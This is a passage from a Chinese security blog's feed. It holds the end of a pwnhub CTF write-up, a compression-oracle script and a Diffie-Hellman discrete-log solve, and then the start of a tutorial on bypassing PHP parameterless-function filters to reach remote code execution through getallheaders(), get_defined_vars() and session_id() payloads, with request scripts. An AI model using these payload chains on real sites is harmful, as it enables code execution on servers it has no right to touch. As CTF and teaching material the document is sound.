flag)</span><br></pre></td></tr></table></figure></p><p>填充flag后，flag出现了3次，而de12只有2次，所以对zlib来说flag出现3次，压缩的更短，导致AES加密后只有128，即分了8组，而其他时候分了10组<br>同时，在原文足够长的时候<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;de12473b-</span><br></pre></td></tr></table></figure></p><p>无论是否压缩，压缩后结果都比较长，经过AES后依旧会分10组<br>这时候，我决定找到一个<code>de1</code>经过压缩会加密分组会变短，而<code>de2</code>经过压缩会加密分组不变的垃圾数据<br>(因为flag不太靠谱，出现过3次，不具有普遍意义)<br>垃圾数据填充到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~!@#$%^&amp;*()_+&#123;&#125;SKYISC(4&amp;^@)#%^de1</span><br><span class="line">~!@#$%^&amp;*()_+&#123;&#125;SKYISC(4&amp;^@)#%^de2</span><br></pre></td></tr></table></figure></p><p>发现长度明显不同<br><img src="/images/2019-03-30-17-32-04.png" alt=""><br>于是将脚本进行改进。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>编写出如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits + <span class="string">'abcdef-&#123;&#125;'</span></span><br><span class="line">s = remote(<span class="string">"40.73.22.31"</span>, <span class="string">"2333"</span>)</span><br><span class="line">flag = <span class="string">'flag&#123;de12473b-'</span></span><br><span class="line">padd = <span class="string">'~!@#$%^&amp;*()_+&#123;&#125;SKYISC(4&amp;^@)#%^'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">now = flag[<span class="number">-2</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">tmp = now+i</span><br><span class="line">s.sendline(padd+tmp)</span><br><span class="line">res = s.recvline()</span><br><span class="line"><span class="keyword">if</span> len(res)&lt;<span class="number">224</span>:</span><br><span class="line">flag +=i</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>运行后可以得到flag<br><img src="/images/2019-03-30-17-35-53.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;de12473b-7105-4f6e-981c-1e4672e7a4b5&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Farewell"><a href="#Farewell" class="headerlink" title="Farewell"></a>Farewell</h2><h3 id="题目概述-1"><a href="#题目概述-1" class="headerlink" title="题目概述"></a>题目概述</h3><p>拿到题目后<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'s'</span>: <span class="comment"># server</span></span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">23333</span>))</span><br><span class="line">    s.listen()</span><br><span class="line">    s, _ = s.accept()</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'c'</span>: <span class="comment"># client</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">23333</span>))</span><br><span class="line"></span><br><span class="line">x = secrets.randbelow(p)</span><br><span class="line">s.send(str(pow(g, x, p)).encode())</span><br><span class="line">r = int(s.recv(<span class="number">2048</span>))</span><br><span class="line">key = pow(r, x, p)</span><br><span class="line">aes = AES.new(sha256(str(key).encode()).digest())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'s'</span>:</span><br><span class="line">    flag = open(<span class="string">'flag.txt'</span>).read()</span><br><span class="line">    flag += <span class="string">' '</span> * (<span class="number">32</span> - len(flag) % <span class="number">32</span>)</span><br><span class="line">    s.send(aes.encrypt(flag))</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'c'</span>:</span><br><span class="line">    print(aes.decrypt(s.recv(<span class="number">2048</span>)))</span><br></pre></td></tr></table></figure></p><p>发现题目是一个Diffle-Hellman密钥交换算法，同时题目用共享密钥key作为AES的密钥加密了flag<br>题目给出了p和g，以及在流量包中有如下值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str(pow(g, x, p)).encode()</span><br><span class="line">r</span><br><span class="line">aes.encrypt(flag)</span><br></pre></td></tr></table></figure></p><p>所以题目思路比较清晰，即利用题目泄露的信息，计算出共享密钥，然后解密密文</p><h3 id="Diffle-Hellman密钥交换算法"><a href="#Diffle-Hellman密钥交换算法" class="headerlink" title="Diffle-Hellman密钥交换算法"></a>Diffle-Hellman密钥交换算法</h3><p>该交换算法原理如下<br>1.Alice和Bob先说好一个大素数p和它的原始根g<br>2.Alice随机产生一个数x， 计算C1=g^x mod p,然后把C1发给Bob；<br>3.Bob随机产生一个数y，计算C2=g^y mod p,然后把C2发给Alice；<br>4.Alice计算k=C2^x mod p;<br>5.Bob计算k*=C1^y mod p;<br>其中值得注意的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k= C2^x mod p= (g^y)^x mod p = (g^x)^y mod p = C1^y mod p = k*</span><br></pre></td></tr></table></figure></p><p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k=k*</span><br></pre></td></tr></table></figure></p><p>那么在该题里，我们有p和g的值<br>同时有<code>g^x mod p</code>和<code>r</code>的值<br>只要我们能通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g^x mod p</span><br></pre></td></tr></table></figure></p><p>计算出x，那么就可以利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r^x mod p</span><br></pre></td></tr></table></figure></p><p>计算出共享密钥k</p><h3 id="私钥计算"><a href="#私钥计算" class="headerlink" title="私钥计算"></a>私钥计算</h3><p>这里我们知道Diffle-Hellman密钥交换算法的安全性建立于有限域上计算离散对数非常困难，但由于这里的g非常小，所以我们可以利用如下脚本进行计算<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g=<span class="number">2</span></span><br><span class="line">po = <span class="number">312827656920665019052154527973062873164155435750834364099549354276600246039780808375717193869518770295806958147314654770520680676883270457649459743668787722703852223185610468575274145823739097462833932263058142549857140269637619269087411010174206045061016542198959480305747562269639856888526630582754886085323913120581662775122656234745332568520238838445916214100660745696922469287938919295619254972946705975683751437282135292172658670815955803075584269128554697234601952297591311295087027674743379383960411103043466786182497597866061129442701995358254124186369249520035589323173168805824570833282035445498782643378768358700682376307190201843700760320696872165065894961224809252051704551991788222733119953751476970741723581723530792919118911052397510799833080000512103966726938986113045128903532639271674853108472379556253636897190191182797552815462576549308131710191832665640046277651599574046021255652154555206626299039923531695289748325251163391286522402130644593746350983380447169395283756146065786333043918764637244487399476582803660120363329563190678655408546077633121456889790401760376550560489115040487451522266237283633048382172370079943143410743342217597309023634940063326550917247604702902550215759784529552401298569555386076473292117763682664669364246320241134117049920406912330431288119412796087737646208534116711021629494365386501930451907402808159838174943862279362834677757884050584093448170667659133693515258906880458166511868847468784977428190810086167564</span></span><br><span class="line">I = Integers(p)</span><br><span class="line">base =I(g)</span><br><span class="line">power = I(po)</span><br><span class="line">x = discrete_log(power,base,I.order()<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br></pre></td></tr></table></figure></p><p>可以计算出x为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">406518553680923303810998357867089986872597384625428296032382082223605988123574210841218447069934463869653305779972123070300843700243223695683842745570568684988254542730892443975304109337441724302279618874884331668884226985266615045139866948788642830842298877192435129229769098933982345569684722762310667192130392534911466160274059969529107046199350538396064656112295906250939672478159817378079309441784880287725371781211748012877184256920210313871719115362010515515110891402855431658223334353873593303525395667978618326801978550187994124468270924013873572498432067645518118093443435418639520888364353499167897138949530744479663644999699224624773483099925521628862586180232198687320947503864600545302221833421275377235509032523457368609815918585758902481553859663387458618816129349463449419087862341088098652933968194993618037910771065808327330647298288575310835586890815804579122178907612697859270737899965594281906994558485264432034470368606167998120003373267066108968891036101743283670490035545481631859464049676062374641157466906693289719168834606604591256752463984131731185528958907446384032245887743211357901745111407737140995225229516243384229267475225313252051953270472323465728081856951111786989858395543299883339743470874543998207949716754885646487861907213598041410526482071904355862055436218492748770410795259787330776539666787777384878258553459788559880593421515430755132522925521857946949333624821971975459183239317332938414550857334189671635116967802683106640</span><br></pre></td></tr></table></figure></p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>得到私钥后，就是计算共享密钥再解密AES了，可以写出如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">r=<span class="number">78087120192506798185304785534036220490682295457985899593552286015760906515956977310718106026282702809422711635619435917331518767851766791450692341186817654392039937276866732823290900777821010247327671241243643650412880368150333211471395035297424887127204256326908722464623917394462679939630749446410387197599335390520467029069728074767246541966424633680601615773218990609115018202108293891151991011803340952544552635132188415103709705346657970777043221314746732187471928545207308547177553542327264672520940226251888781036654093770411265925735389942610651694464713219676594471860313120475954809929673190737166098124441789345848214708040517022155838996124293848907006907419888109057810382829316850548709211468528812150512419577354250048007280565757975359757844819724279701194952271971968109182400983285949430466403580176579808358235196432047919412166611978194160383972820803839428543781819223102375217858138264186633827564726154084918862464617886404527934356701470162555172341817057875835953741671717748853387699781466740938591750994343486592410583776852328678921121336669128939343468165354791232165526407821586702774092562342825423846314736479769371630140795341485570538796652969642206321722350767458962990861456051369560315789943007263349872724565868324293287652102593428824637171300666426843580254096051705945897970157438347228211952956498549949387040740580715926063683264912465718505170513257955773741351861008670710537188992538116637590461265650926502662281478520940158</span></span><br><span class="line">x=<span class="number">406518553680923303810998357867089986872597384625428296032382082223605988123574210841218447069934463869653305779972123070300843700243223695683842745570568684988254542730892443975304109337441724302279618874884331668884226985266615045139866948788642830842298877192435129229769098933982345569684722762310667192130392534911466160274059969529107046199350538396064656112295906250939672478159817378079309441784880287725371781211748012877184256920210313871719115362010515515110891402855431658223334353873593303525395667978618326801978550187994124468270924013873572498432067645518118093443435418639520888364353499167897138949530744479663644999699224624773483099925521628862586180232198687320947503864600545302221833421275377235509032523457368609815918585758902481553859663387458618816129349463449419087862341088098652933968194993618037910771065808327330647298288575310835586890815804579122178907612697859270737899965594281906994558485264432034470368606167998120003373267066108968891036101743283670490035545481631859464049676062374641157466906693289719168834606604591256752463984131731185528958907446384032245887743211357901745111407737140995225229516243384229267475225313252051953270472323465728081856951111786989858395543299883339743470874543998207949716754885646487861907213598041410526482071904355862055436218492748770410795259787330776539666787777384878258553459788559880593421515430755132522925521857946949333624821971975459183239317332938414550857334189671635116967802683106640</span></span><br><span class="line">p=<span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g=<span class="number">2</span></span><br><span class="line">po=<span class="number">312827656920665019052154527973062873164155435750834364099549354276600246039780808375717193869518770295806958147314654770520680676883270457649459743668787722703852223185610468575274145823739097462833932263058142549857140269637619269087411010174206045061016542198959480305747562269639856888526630582754886085323913120581662775122656234745332568520238838445916214100660745696922469287938919295619254972946705975683751437282135292172658670815955803075584269128554697234601952297591311295087027674743379383960411103043466786182497597866061129442701995358254124186369249520035589323173168805824570833282035445498782643378768358700682376307190201843700760320696872165065894961224809252051704551991788222733119953751476970741723581723530792919118911052397510799833080000512103966726938986113045128903532639271674853108472379556253636897190191182797552815462576549308131710191832665640046277651599574046021255652154555206626299039923531695289748325251163391286522402130644593746350983380447169395283756146065786333043918764637244487399476582803660120363329563190678655408546077633121456889790401760376550560489115040487451522266237283633048382172370079943143410743342217597309023634940063326550917247604702902550215759784529552401298569555386076473292117763682664669364246320241134117049920406912330431288119412796087737646208534116711021629494365386501930451907402808159838174943862279362834677757884050584093448170667659133693515258906880458166511868847468784977428190810086167564</span></span><br><span class="line">key = pow(r,x,p)</span><br><span class="line">c = <span class="string">'0e10f06cc8a34a8b93d2f5afd2a32109413fc6c1bdf3985fa55a7427f5befb215afe920b4c9f1c5fd7cd8621eccbce74842474de9eab381535ca5a3d0d21d37a'</span></span><br><span class="line">aes = AES.new(sha256(str(key).encode()).digest())</span><br><span class="line"><span class="keyword">print</span> aes.decrypt(c.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure></p><p>运行后可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2D7A22A4-68C9-46A9-A209-E5623917A864&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这次pwnhub的crypto比以往简单不少……做完后甚至有点不敢相信……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;正逢pwnhub有比赛，于是做了一下题目，以下是题解&lt;/p&gt;
&lt;h2 id=&quot;Happy-Tree-Friends&quot;&gt;&lt;a href=&quot;#H
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>PHP Parametric Function RCE</title>
    <link href="http://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/"/>
    <id>http://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</id>
    <published>2019-03-29T04:50:27.000Z</published>
    <updated>2019-04-04T06:02:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做了一些php 无参数函数执行的题目，这里做一个总结，以便以后bypass各种正则过滤。<br>大致思路如下：<br>1.利用超全局变量进行bypass，进行RCE<br>2.进行任意文件读取</p><h2 id="什么是无参数函数RCE"><a href="#什么是无参数函数RCE" class="headerlink" title="什么是无参数函数RCE"></a>什么是无参数函数RCE</h2><p>传统意义上，如果我们有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure></p><p>即代表我们拥有了一句话木马，可以进行getshell，例如<br><img src="/images/2019-03-29-13-00-08.png" alt=""><br>但是如果有如下限制<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们会发现我们使用参数则无法通过正则的校验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure></p><p>而该正则，正是我们说的无参数函数的校验，其只允许执行如下格式函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()));</span><br><span class="line"></span><br><span class="line">a();</span><br></pre></td></tr></table></figure></p><p>但不允许<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(&apos;123&apos;);</span><br></pre></td></tr></table></figure></p><p>这样一来，失去了参数，我们进行RCE的难度则会大幅上升。<br>而本篇文章旨在bypass这种限制，并做出一些更苛刻条件的Bypass。</p><h2 id="法1：getenv"><a href="#法1：getenv" class="headerlink" title="法1：getenv()"></a>法1：getenv()</h2><p>查阅php手册，有非常多的超全局变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br><span class="line">$_REQUEST</span><br><span class="line">$_ENV</span><br></pre></td></tr></table></figure></p><p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code><br><img src="/images/2019-03-29-13-45-53.png" alt=""><br>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：<br><img src="/images/2019-03-29-13-47-19.png" alt=""><br>效果如下<br><img src="/images/2019-03-29-13-46-53.png" alt=""><br>但是我不想要下标，我想要数组的值，那么我们可以使用<br><img src="/images/2019-03-29-13-47-44.png" alt=""><br>两者结合使用即可有如下效果<br><img src="/images/2019-03-29-13-47-02.png" alt=""><br>我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数</p><h2 id="法二：getallheaders"><a href="#法二：getallheaders" class="headerlink" title="法二：getallheaders()"></a>法二：getallheaders()</h2><p>之前我们获取的是所有环境变量的列表，但其实我们并不需要这么多信息。仅仅http header即可<br>在apache2环境下，我们有函数getallheaders()可返回<br>我们可以看一下返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123; </span><br><span class="line">    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; </span><br><span class="line">    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; </span><br><span class="line">    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; </span><br><span class="line">    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; </span><br><span class="line">    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; </span><br><span class="line">    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到，成功返回了http header，我们可以在header中做一些自定义的手段，例如<br><img src="/images/2019-03-29-13-14-31.png" alt=""><br>此时我们再将结果中的恶意命令取出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-29-13-15-44.png" alt=""><br>这样一来相当于我们将http header中的sky变成了我们的参数，可用其进行bypass 无参数函数执行<br>例如<br><img src="/images/2019-03-29-13-17-09.png" alt=""><br>那么可以进一步利用http header的sky属性进行rce<br><img src="/images/2019-03-29-13-17-52.png" alt=""></p><h2 id="法三：get-defined-vars"><a href="#法三：get-defined-vars" class="headerlink" title="法三：get_defined_vars()"></a>法三：get_defined_vars()</h2><p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？<br>这里我们可以使用get_defined_vars()，首先看一下它的回显<br><img src="/images/2019-03-29-13-20-36.png" alt=""><br>发现其可以回显全局变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure></p><p>我们这里的选择也就具有多样性，可以利用<code>$_GET</code>进行RCE，例如<br><img src="/images/2019-03-29-13-22-28.png" alt=""><br>还是和之前的思路一样，将恶意参数取出<br><img src="/images/2019-03-29-13-23-25.png" alt=""><br>发现可以成功RCE<br>但一般网站喜欢对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure></p><p>做全局过滤，所以我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传<br><img src="/images/2019-03-29-13-30-34.png" alt=""><br>可以发现空格会被替换成<code>_</code>，为防止干扰我们用hex编码进行RCE<br><img src="/images/2019-03-29-13-31-48.png" alt=""><br>最终脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('ls /tmp');"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">  payload: BytesIO(<span class="string">'sky cool!'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span>, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><h2 id="法四：session-id"><a href="#法四：session-id" class="headerlink" title="法四：session_id()"></a>法四：session_id()</h2><p>之前我们使用<code>$_FILES</code>下手，其实这里还能从<code>$_COOKIE</code>下手：<br>我们有函数<br><img src="/images/2019-03-29-13-34-09.png" alt=""><br>可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即<code>hex2bin</code><br>脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/?code=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo 'sky cool';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>即可达成RCE和bypass的目的</p><h2 id="法五：dirname-amp-chdir"><a href="#法五：dirname-amp-chdir" class="headerlink" title="法五：dirname() &amp; 